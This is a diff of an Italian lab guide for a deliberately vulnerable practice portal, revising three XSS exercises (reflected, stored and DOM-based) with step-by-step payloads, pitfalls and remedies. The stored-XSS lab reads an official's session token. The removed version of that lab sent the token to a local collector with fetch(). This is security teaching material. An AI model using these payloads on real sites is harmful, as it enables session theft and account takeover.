@@ -413,71 +413,69 @@ ripulito: va cancellato a mano.
 `Content-Disposition: attachment`, dominio separato per i contenuti caricati.
 
 **Stato:** provato il 20 novembre 2026.
-## L14 — XSS riflesso `[progetto]`
-
-**Prerequisiti:** nessuno (il modulo contatti è pubblico).
-
-**Passi**
-
-1. Apri "Scrivi all'ufficio".
-2. Invia `<img src=x onerror=alert(document.domain)>`.
-
-**Cosa osservare:** lo script gira nel contesto del portale, non in quello dell'utente. Con
-`document.cookie` si legge il cookie di sessione del modulo legacy: manca `HttpOnly`.
-
-**Se non funziona:** se il testo appare "sporco", qualcuno ha cambiato `{!! !!}` in `{{ }}`.
-
-**Rimedio da spiegare:** escape in uscita, non in entrata; CSP come seconda linea.
-
-## L15 — XSS stored e furto del token `[progetto]`
-
-**Prerequisiti:** due finestre; la vittima è la finestra in incognito con l'account di Sara.
-
-**Passi**
-
-1. Nella finestra normale sei Giulia: apri la **tua** pratica e aggiungi una nota con il payload.
-   La nota è un'"integrazione alla pratica", funzione che il cittadino ha davvero.
-2. Sara, quando lavora la tua pratica, apre la stessa pagina nel modulo sportello e la nota
-   viene resa come HTML.
-3. Payload:
-
-```html
-<img src=x onerror="fetch('http://127.0.0.1:8026/c?t='+encodeURIComponent(localStorage.getItem('token'))+'&cf='+encodeURIComponent(localStorage.getItem('cf')))">
-```
-
-4. Nella finestra in incognito, entra come Sara e apri la pratica: l'immagine parte, il token
-   arriva su `esca`.
-5. Apri `http://127.0.0.1:8026` e copia il token.
-6. Nella finestra normale: DevTools → Application → Local Storage, sostituisci `token`, ricarica.
-
-**Cosa osservare:** Sara non ha cliccato niente di strano: ha aperto una pratica. La differenza
-tra XSS riflesso e stored è che la vittima non deve fare nulla.
-
-**Se non funziona:** controlla che `esca` sia raggiungibile dal browser (`127.0.0.1:8026`) e che
-il payload non venga salvato escapato (`{!! !!}`).
-
-**Rimedio da spiegare:** sanitizzazione con whitelist (HTML purifier), CSP, e soprattutto:
-perché un token rubabile vale l'intero account.
-
-## L16 — XSS DOM `[progetto]`
+## L14 — XSS riflessa `[verificato]`
 
 **Prerequisiti:** nessuno.
 
 **Passi**
 
-1. `GET /accedi?torna=<img src=x onerror=alert(1)>`.
-2. Lo script gira senza che nulla passi dal server: guarda il codice della SPA, la riga con
-   `innerHTML`.
+1. `GET http://<host>:8081/api/contatti` → il modulo pubblico.
+2. `GET http://<host>:8081/api/contatti?nome=prova&messaggio=<script>alert(document.domain)</script>`
+   (con l'URL codificato) → la pagina di conferma esegue lo script.
 
-**Cosa osservare:** nei log del server la richiesta non contiene nulla di sospetto — l'ha
-eseguita il client. È il finding che dimostra perché i filtri lato server non bastano.
+**Cosa osservare:** il modulo accetta `GET`, quindi il payload vive in un collegamento
+condivisibile. La conferma è costruita concatenando l'input.
 
-**Rimedio da spiegare:** `textContent` invece di `innerHTML`; sanitizzazione lato client.
+**Trappola:** con `curl` si vede la stringa, non l'esecuzione: serve il browser.
 
----
+**Rimedio da spiegare:** escape in uscita, `Content-Security-Policy`, e un modulo che accetta
+solo `POST`.
 
-# Capitolo 5 — Iniezione
+**Stato:** provato il 20 novembre 2026.
+## L15 — XSS conservata e furto del token `[verificato]`
 
+**Prerequisiti:** un funzionario con pratiche assegnate (Sara Bianchi si ottiene con L17) e il
+cittadino proprietario di una di quelle pratiche (dizionario di L08).
+
+**Passi**
+
+1. Come funzionario, `GET /api/sportello/pratiche` → scegli una pratica della sua lista.
+2. Come cittadino proprietario, `POST /api/pratiche/{id}/nota` con
+   `<img src=x onerror="window.__rubato=localStorage.getItem('adu.token')">`.
+3. Apri la SPA come funzionario e vai su `#/sportello`: la nota viene resa con `innerHTML` e
+   l'`onerror` esegue.
+4. Il token letto è quello del funzionario, e dopo L09 non scade.
+
+**Cosa osservare:** la nota è nel database, quindi non c'è niente da intercettare in transito:
+l'attacco vive nel tempo, e colpisce chi apre la pagina dopo.
+
+**Trappole:** `<script>` inserito con `innerHTML` **non** esegue (lo vieta lo standard): serve un
+`<img onerror>`. Il funzionario vede solo le proprie pratiche. La pagina legacy
+`/sportello/pratica/{id}` è un secondo sink, con la sessione del funzionario.
+
+**Rimedio da spiegare:** mai `innerHTML` su contenuto esterno (`textContent` o sanitizzazione),
+CSP, e token non leggibili da JavaScript se si torna ai cookie `httpOnly`.
+
+**Stato:** provato il 20 novembre 2026 con Chromium: la nota esegue e legge `adu.token`.
+## L16 — XSS nel DOM `[verificato]`
+
+**Prerequisiti:** nessuno.
+
+**Passi**
+
+1. Apri `http://<host>:8080/?torna=<img src=x onerror=alert(1)>#/accedi`.
+2. Lo script esegue nell'origine del portale, senza che l'API riceva nulla.
+
+**Cosa osservare:** il server non vede il payload: nessuna richiesta, nessun log. La funzione di
+escape esiste (`testo()`) e qui non è usata.
+
+**Trappole:** senza il frammento `#/accedi` la SPA non instrada. Il payload va codificato
+nell'URL. `alert()` può essere bloccato: verifica scrivendo nel DOM.
+
+**Rimedio da spiegare:** `textContent` invece di `innerHTML`, CSP, e consapevolezza che il client
+è superficie d'attacco.
+
+**Stato:** provato il 20 novembre 2026 con Playwright.
 ## L11 — UNION e information disclosure `[progetto]`
 
 **Prerequisiti:** account **funzionario** (la ricerca pratiche è nello sportello).
@@ -653,9 +651,9 @@ entrare la classe: un lab che non funziona in aula costa più di uno che non c'�
 | L11 | UNION + error-based | `[progetto]` |
 | L12 | Blind + time-based | `[progetto]` |
 | L13 | Command injection | `[progetto]` |
-| L14 | XSS riflesso | `[progetto]` |
-| L15 | XSS stored + furto token | `[progetto]` |
-| L16 | XSS DOM | `[progetto]` |
+| L14 | XSS riflesso | `[verificato]` |
+| L15 | XSS stored + furto token | `[verificato]` |
+| L16 | XSS DOM | `[verificato]` |
 | L17 | Reset prevedibile + OTP | `[verificato]` |
 | L18 | Race condition | `[progetto]` |
 | L19 | Configurazione ed esposizione | `[progetto]` |
